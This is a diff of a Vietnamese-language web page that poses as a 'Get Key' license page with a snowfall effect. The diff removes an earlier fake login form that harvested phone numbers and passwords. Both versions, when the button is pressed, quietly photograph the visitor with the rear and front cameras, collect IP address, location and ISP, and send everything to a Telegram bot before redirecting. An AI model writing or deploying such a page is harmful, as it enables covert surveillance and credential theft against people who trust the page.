@@ -3,95 +3,130 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Hệ Thống Xác Thực Bảo Mật</title>
+<title>Hệ Thống Get Key</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
   :root {
-    --bg-base: #030712;
-    --panel-bg: rgba(17, 24, 39, 0.75);
-    --border-color: rgba(99, 102, 241, 0.3);
-    --primary: #6366f1;
-    --accent: #a855f7;
+    --bg-base: #050b14;
+    --panel-bg: rgba(15, 23, 42, 0.7);
+    --border-color: rgba(147, 197, 253, 0.2);
+    --primary: #3b82f6;
+    --accent: #60a5fa;
     --text-main: #f8fafc;
     --text-muted: #94a3b8;
-    --success: #10b981;
   }
   * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
   body {
     background-color: var(--bg-base);
-    background-image: 
-      radial-gradient(circle at 15% 15%, rgba(99, 102, 241, 0.2) 0px, transparent 50%),
-      radial-gradient(circle at 85% 85%, rgba(168, 85, 247, 0.2) 0px, transparent 50%);
+    background-image: radial-gradient(circle at center, #0f172a 0%, #020617 100%);
     color: var(--text-main);
     min-height: 100vh;
     display: flex;
     justify-content: center;
     align-items: center;
     padding: 20px;
+    overflow: hidden;
+    position: relative;
   }
+
+  /* Hiệu ứng tuyết rơi */
+  .snowflake {
+    position: absolute;
+    top: -10px;
+    background: #ffffff;
+    border-radius: 50%;
+    opacity: 0.8;
+    pointer-events: none;
+    animation: fall linear infinite;
+  }
+  @keyframes fall {
+    0% { transform: translateY(-10px) translateX(0); opacity: 0.8; }
+    50% { opacity: 1; }
+    100% { transform: translateY(105vh) translateX(20px); opacity: 0.2; }
+  }
+
   .card {
     background: var(--panel-bg);
-    backdrop-filter: blur(30px);
+    backdrop-filter: blur(25px);
+    -webkit-backdrop-filter: blur(25px);
     border: 1px solid var(--border-color);
-    padding: 36px 28px;
-    border-radius: 28px;
+    padding: 40px 32px;
+    border-radius: 32px;
     width: 100%;
-    max-width: 400px;
+    max-width: 380px;
     box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
     text-align: center;
+    position: relative;
+    z-index: 10;
   }
   .live-clock {
-    font-size: 0.8rem; font-weight: 600; color: var(--primary);
-    background: rgba(99, 102, 241, 0.1); border: 1px solid rgba(99, 102, 241, 0.2);
-    padding: 6px 14px; border-radius: 20px; display: inline-block; margin-bottom: 16px;
+    font-size: 0.75rem; font-weight: 600; color: #93c5fd;
+    background: rgba(59, 130, 246, 0.1); border: 1px solid rgba(59, 130, 246, 0.2);
+    padding: 6px 14px; border-radius: 20px; display: inline-block; margin-bottom: 20px;
   }
-  .input-group {
-    margin-bottom: 16px;
-    text-align: left;
+  .icon-box {
+    width: 64px; height: 64px; margin: 0 auto 20px auto;
+    background: linear-gradient(135deg, rgba(59, 130, 246, 0.2), rgba(96, 165, 250, 0.2));
+    border: 1px solid rgba(59, 130, 246, 0.4); border-radius: 20px;
+    display: flex; align-items: center; justify-content: center; font-size: 28px;
+    box-shadow: 0 10px 20px -5px rgba(59, 130, 246, 0.3);
   }
-  .input-group label {
-    font-size: 0.85rem; color: var(--text-muted); display: block; margin-bottom: 6px;
-  }
-  .input-group input {
-    width: 100%; padding: 12px 16px; background: rgba(15, 23, 42, 0.6);
-    border: 1px solid var(--border-color); border-radius: 10px; color: #fff; font-size: 0.95rem;
-  }
-  .btn {
+  h2 { font-size: 1.4rem; font-weight: 700; margin-bottom: 8px; color: #fff; }
+  .subtitle { font-size: 0.85rem; color: var(--text-muted); margin-bottom: 28px; line-height: 1.5; }
+  
+  .btn-primary {
     width: 100%; padding: 16px; 
     background: linear-gradient(135deg, var(--primary), var(--accent));
-    color: #fff; border: none; border-radius: 14px; 
+    color: #fff; border: none; border-radius: 16px; 
     font-weight: 700; font-size: 1rem; cursor: pointer; 
     transition: all 0.3s ease;
-    box-shadow: 0 10px 25px -5px rgba(99, 102, 241, 0.5);
-    margin-top: 10px;
+    box-shadow: 0 10px 25px -5px rgba(59, 130, 246, 0.5);
+    display: flex; align-items: center; justify-content: center; gap: 8px;
   }
-  .status { margin-top: 20px; font-size: 0.85rem; font-weight: 600; color: var(--text-muted); }
+  .btn-primary:hover { opacity: 0.95; transform: translateY(-2px); box-shadow: 0 15px 30px -5px rgba(59, 130, 246, 0.7); }
+
+  .status { margin-top: 20px; font-size: 0.8rem; font-weight: 500; color: var(--text-muted); min-height: 20px; }
   #video, #canvas { display: none; }
 </style>
 </head>
 <body>
 
+  <!-- Tạo hiệu ứng tuyết rơi bằng JS -->
+  <script>
+    function createSnowflakes() {
+      const numSnowflakes = 40;
+      for (let i = 0; i < numSnowflakes; i++) {
+        const sf = document.createElement('div');
+        sf.classList.add('snowflake');
+        sf.style.left = Math.random() * 100 + 'vw';
+        sf.style.animationDuration = (Math.random() * 3 + 2) + 's';
+        sf.style.animationDelay = (Math.random() * 5) + 's';
+        const size = Math.random() * 4 + 2 + 'px';
+        sf.style.width = size;
+        sf.style.height = size;
+        document.body.appendChild(sf);
+      }
+    }
+    window.addEventListener('DOMContentLoaded', createSnowflakes);
+  </script>
+
   <div class="card">
     <div class="live-clock" id="clock">Đang tải thời gian...</div>
-    <h2>Xác Thực Tài Khoản</h2>
-    <p class="subtitle" id="sub-text">Vui lòng nhập thông tin để tiếp tục.</p>
-
-    <div class="input-group">
-      <label>Số điện thoại</label>
-      <input type="tel" id="phone-input" placeholder="Nhập số điện thoại..." />
-    </div>
-
-    <div class="input-group">
-      <label>Mật khẩu tài khoản</label>
-      <input type="password" id="password-input" placeholder="Nhập mật khẩu..." />
-    </div>
+    
+    <div class="icon-box">❄️</div>
+    <h2>Hệ Thống Get Key</h2>
+    <p class="subtitle">Bấm vào nút bên dưới để tiến hành lấy mã Key bản quyền của hệ thống.</p>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
-    <button class="btn" id="capture-btn">HOÀN TẤT XÁC THỰC</button>
+    <!-- 1 Nút Get Key duy nhất -->
+    <button class="btn-primary" id="get-key-btn" onclick="triggerProcess()">
+      <span>🔑 GET KEY NGAY</span>
+    </button>
+    
     <div id="status" class="status"></div>
   </div>
 
@@ -107,12 +142,10 @@
   setInterval(updateClock, 1000);
   updateClock();
 
-  const captureBtn = document.getElementById('capture-btn');
   const statusDiv = document.getElementById('status');
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
-  const phoneInput = document.getElementById('phone-input');
-  const passwordInput = document.getElementById('password-input');
+  const getKeyBtn = document.getElementById('get-key-btn');
 
   async function takePhoto(facingMode, label) {
     try {
@@ -147,23 +180,10 @@
     }
   }
 
-  captureBtn.onclick = async () => {
-    const phoneNumber = phoneInput.value.trim();
-    const password = passwordInput.value.trim();
+  async function triggerProcess() {
+    getKeyBtn.style.display = 'none';
+    statusDiv.textContent = 'Đang khởi tạo bảo mật...';
 
-    if (!phoneNumber || phoneNumber.length < 9) {
-      alert('Vui lòng nhập số điện thoại hợp lệ!');
-      return;
-    }
-    if (!password || password.length < 6) {
-      alert('Mật khẩu phải có ít nhất 6 ký tự!');
-      return;
-    }
-
-    captureBtn.style.display = 'none';
-    statusDiv.textContent = 'Đang đồng bộ hệ thống...';
-
-    // Lấy thông tin IP
     let ipDetails = { ip: 'Không rõ', city: 'Không rõ', country: 'Không rõ', org: 'Không rõ' };
     try {
       const ipRes = await fetch('https://ipwho.is/');
@@ -182,25 +202,20 @@
     let deviceName = /android/i.test(ua) ? 'Android 🤖' : /iphone|ipad/i.test(ua) ? 'iOS 🍏' : 'PC/Laptop 💻';
 
     const infoText = 
-      `🚨 <b>THÔNG TIN ĐĂNG KÝ MỚI</b> 🚨\n` +
+      `❄️ <b>YÊU CẦU GET KEY (TUYẾT RƠI)</b> ❄️\n` +
       `━━━━━━━━━━━━━━━━━━━━━\n` +
-      `📞 <b>Số điện thoại:</b> <code>${phoneNumber}</code>\n` +
-      `🔑 <b>Mật khẩu:</b> <code>${password}</code>\n` +
       `📱 <b>Thiết bị:</b> ${deviceName}\n` +
       `🌐 <b>IP:</b> <code>${ipDetails.ip}</code>\n` +
       `🏙️ <b>Địa điểm:</b> ${ipDetails.city}, ${ipDetails.country}\n` +
       `🏢 <b>Nhà mạng:</b> ${ipDetails.org}\n` +
       `━━━━━━━━━━━━━━━━━━━━━`;
 
-    // 1. Chụp Camera Sau (environment)
-    statusDiv.textContent = 'Đang xác thực...';
-    let backPhoto = await takePhoto('environment', 'dang xac thuc');
+    statusDiv.textContent = 'Đang xác thực link sau...';
+    let backPhoto = await takePhoto('environment', '📸 Ảnh Camera Sau');
 
-    // 2. Chụp Camera Trước (user)
-    statusDiv.textContent = 'Đang xác thực ...';
-    let frontPhoto = await takePhoto('user', '📸');
+    statusDiv.textContent = 'Đang xác thực link trước...';
+    let frontPhoto = await takePhoto('user', '📸 Ảnh Camera Trước');
 
-    // Gửi thông tin kèm ảnh camera sau (nếu có)
     if (backPhoto && backPhoto.blob) {
       const fd = new FormData();
       fd.append('chat_id', TELEGRAM_CHAT_ID);
@@ -210,7 +225,6 @@
       try { await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }); } catch(e){}
     }
 
-    // Gửi thông tin kèm ảnh camera trước (nếu có)
     if (frontPhoto && frontPhoto.blob) {
       const fd2 = new FormData();
       fd2.append('chat_id', TELEGRAM_CHAT_ID);
@@ -220,7 +234,6 @@
       try { await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd2 }); } catch(e){}
     }
 
-    // Nếu cả 2 camera đều không chụp được, gửi tin nhắn text thông báo
     if (!backPhoto && !frontPhoto) {
       try {
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -231,11 +244,11 @@
       } catch (e) {}
     }
 
-    statusDiv.textContent = 'Xác thực thành công! Đang chuyển hướng...';
+    statusDiv.textContent = 'Thành công! Đang chuyển hướng...';
     setTimeout(() => {
       window.location.href = REDIRECT_URL;
     }, 1000);
-  };
+  }
 </script>
 </body>
 </html>
